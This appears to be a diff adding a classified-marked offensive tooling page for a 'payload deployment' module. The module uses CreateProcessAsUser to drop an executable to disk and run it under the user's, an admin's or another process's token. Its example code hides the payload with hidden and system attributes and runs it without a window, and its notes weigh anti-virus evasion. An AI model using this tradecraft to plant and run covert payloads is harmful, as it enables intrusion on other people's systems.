@@ -1,0 +1,79 @@
+
+                        Create Process As Current User +Admin (CreateProcessAsUser_LEP - Leopard)
+SECRET//NOFORN
+ 
+OSB Library: Paylaod Deployment
+
+Module Name: CreateProcessAsUser_LEP - Leopard
+ 
+Module Description: This module uses the CreateProcessAsUser Windows APIApplication Programming Interface call. The module let's the caller specify where to write a payload (if specified) and with what attributes. The module lets the caller specify whether the payload should be run as the current interactive user, the current interactive user's administrator token (if available) or another process's token. The caller may also configure the flags used in process creation as well as whether the module returns a handle to the created process.
+ 
+PSP/OS Issues: PSPs should be checked on a per tool basis.
+ 
+('excerpt' missing)
+ 
+Sharing Level: Liaison (Well known APIApplication Programming Interface call)
+ 
+Technique Origin: Well known Windows APIApplication Programming Interface call used for creating process with a different token.
+ 
+Notes: 
+
+Potential PSPPersonal Security Product (Anti-Virus) issues - should be tested on case by case basis
+Only allows you to run as the current interactive user.
+May be permission issues with obtaining tokens from certain processes.
+
+ 
+Module Specific Structures: 
+
+static enum eExecLevel
+{
+	eUser,
+	eAdmin,
+	eProcess
+};
+
+
+
+struct PARAM_LEP
+{
+	eExecLevel eLevel;		//The level you wish the payload to be executed as.
+	DWORD dwAttribs;		//The attributes of the target payload on disk
+	DWORD dwFlags;			//Flags for process creation. Default: FILE_ATTRIBUTE_NORMAL
+	WCHAR *wcTargetPath;	//The target path of the executable to drop to disk
+	BOOL bRetHandle;		//Specifies whether the module should fill returnHandle or close the handle itself
+	WCHAR *wcArgs;			//Arguments for the payload on disk
+	DWORD dwPID;			//If eProcess is specified as the eLevel, this PIDProcess ID specifies the process token you wish to use in creating the process
+};
+
+
+ 
+ 
+Example Code:
+ 
+HANDLE hHandle = NULL;
+
+
+IPayload *myPayload = new CreateProcessAsUser_LEP();
+
+
+PARAM_LEP params;
+SecureZeroMemory(¶ms, sizeof(params));
+params.dwAttribs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
+params.wcTargetPath = L"C:\\Test Folder\\MyTest.exe";
+params.wcArgs = L"1 2 3";
+params.dwFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW;
+params.bRetHandle = FALSE;
+params.eLevel = eUser;
+
+
+//Create Process As Current User
+IPayload::PayloadErr pErr = myPayload->execute(improvedDummy, sizeof(improvedDummy), ¶ms, sizeof(params), &hHandle);
+ 
+ 
+SECRET//NOFORN
+
+Previous versions:
+| 1 SECRET
+| 2 SECRET
+|
+                    
